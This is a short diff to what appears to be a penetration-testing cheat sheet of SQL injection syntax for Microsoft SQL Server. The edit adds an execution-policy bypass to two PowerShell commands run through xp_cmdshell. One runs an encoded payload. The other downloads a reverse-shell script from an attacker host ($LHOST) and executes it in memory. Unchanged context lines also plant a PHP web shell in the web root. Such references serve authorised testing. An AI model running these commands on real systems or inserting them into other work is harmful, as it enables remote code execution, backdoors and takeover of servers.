@@ -229,7 +229,7 @@ Quick syntax reference for the four most common databases encountered during pen
         ```sql wrap
         -- Via xp_cmdshell
         EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
-        EXEC xp_cmdshell 'powershell -enc $B64_PAYLOAD';
+        EXEC xp_cmdshell 'powershell -ep bypass -enc $B64_PAYLOAD';
         ```
       </Tab>
       <Tab title="SQLite">
@@ -273,7 +273,7 @@ Quick syntax reference for the four most common databases encountered during pen
 
     -- Execute commands
     EXEC xp_cmdshell 'whoami';
-    EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/rev.ps1'')"';
+    EXEC xp_cmdshell 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/rev.ps1'')"';
     ```
   </Tab>
   <Tab title="SQLite">
